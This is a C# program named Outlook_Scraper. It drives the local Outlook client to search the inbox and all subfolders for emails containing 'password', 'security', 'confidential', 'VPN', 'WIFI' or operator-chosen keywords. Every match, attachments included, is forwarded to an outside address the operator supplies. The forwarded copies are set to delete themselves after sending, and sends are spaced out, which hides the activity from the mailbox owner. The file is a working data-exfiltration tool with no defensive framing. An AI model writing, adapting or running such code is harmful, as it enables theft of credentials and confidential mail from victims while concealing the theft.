using System;
using System.Text.RegularExpressions;
using Microsoft.Office.Interop.Outlook;
using System.Collections.Generic;
using System.Linq;

namespace OutlookEmailSearch
{
    class Outlook_Scraper
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter the email address to forward matching emails:");
            string forwardToEmail = Console.ReadLine();

            Console.WriteLine("Would you like to only scrape for the following 'password' 'security' 'confidential' 'VPN' and 'WIFI' keywords (Y/N)");
            string includeDefaultKeywordsInput = Console.ReadLine();
            bool includeDefaultKeywords = includeDefaultKeywordsInput.Equals("Y", StringComparison.OrdinalIgnoreCase);

            string[] additionalKeywords = null;
            if (!includeDefaultKeywords)
            {
                Console.WriteLine("Enter additional keywords (comma-separated):");
                string additionalKeywordsInput = Console.ReadLine();
                additionalKeywords = additionalKeywordsInput.Split(',');
            }

            dynamic outlookApp = Activator.CreateInstance(Type.GetTypeFromProgID("Outlook.Application"));
            dynamic namespaceMAPI = outlookApp.GetNamespace("MAPI");

            dynamic inboxFolder = namespaceMAPI.GetDefaultFolder(OlDefaultFolders.olFolderInbox);
            ProcessFolder(inboxFolder, forwardToEmail, includeDefaultKeywords, additionalKeywords);

            // Release COM objects
            System.Runtime.InteropServices.Marshal.ReleaseComObject(inboxFolder);
            System.Runtime.InteropServices.Marshal.ReleaseComObject(namespaceMAPI);
            System.Runtime.InteropServices.Marshal.ReleaseComObject(outlookApp);

            // Garbage collection
            GC.Collect();
            GC.WaitForPendingFinalizers();
        }

        static void ProcessFolder(dynamic folder, string forwardToEmail, bool includeDefaultKeywords, string[] additionalKeywords)
        {
            dynamic items = folder.Items;
            items.IncludeRecurrences = true;

            List<string> allKeywords = new List<string>();
            if (includeDefaultKeywords)
            {
                string[] defaultKeywords = { "password", "security", "confidential", "VPN", "WIFI" };
                allKeywords.AddRange(defaultKeywords);
            }

            if (additionalKeywords != null)
            {
                allKeywords.AddRange(additionalKeywords);
            }

            foreach (dynamic email in items)
            {
                try
                {
                    foreach (string keyword in allKeywords)
                    {
                        if (email.Subject.Contains(keyword) || Regex.IsMatch(email.Body, @"\b" + keyword + @"\b", RegexOptions.IgnoreCase | RegexOptions.Multiline))
                        {
                            string subject = email.Subject;
                            string sender = email.SenderEmailAddress;
                            string recipients = email.To;
                            string body = email.Body;

                            dynamic forwardEmail = email.Forward();
                            forwardEmail.Subject = "Matching Email Information: " + subject;
                            forwardEmail.Body = "Sender: " + sender + "\nRecipients: " + recipients + "\n\n" + body;
                            forwardEmail.To = forwardToEmail;
                            forwardEmail.DeleteAfterSubmit = true;

                            dynamic attachments = email.Attachments;
                            for (int i = 1; i <= attachments.Count; i++)
                            {
                                dynamic attachment = attachments[i];
                                string tempPath = System.IO.Path.GetTempPath() + attachment.FileName;
                                attachment.SaveAsFile(tempPath);
                                forwardEmail.Attachments.Add(tempPath);
                            }

                            forwardEmail.Send();
                            Console.WriteLine("Matching email found. Forwarded the email information to " + forwardToEmail);
                            System.Threading.Thread.Sleep(5000);
                        }
                    }
                }
                catch (System.Runtime.InteropServices.COMException ex)
                {
                    // Handle the exception here (e.g., log the error)
                    Console.WriteLine("Error occurred while processing an email: " + ex.Message);
                }
            }

            dynamic subfolders = folder.Folders;
            foreach (dynamic subfolder in subfolders)
            {
                ProcessFolder(subfolder, forwardToEmail, includeDefaultKeywords, additionalKeywords);
            }

            // Release COM objects
            System.Runtime.InteropServices.Marshal.ReleaseComObject(items);
            System.Runtime.InteropServices.Marshal.ReleaseComObject(subfolders);
        }
    }
}
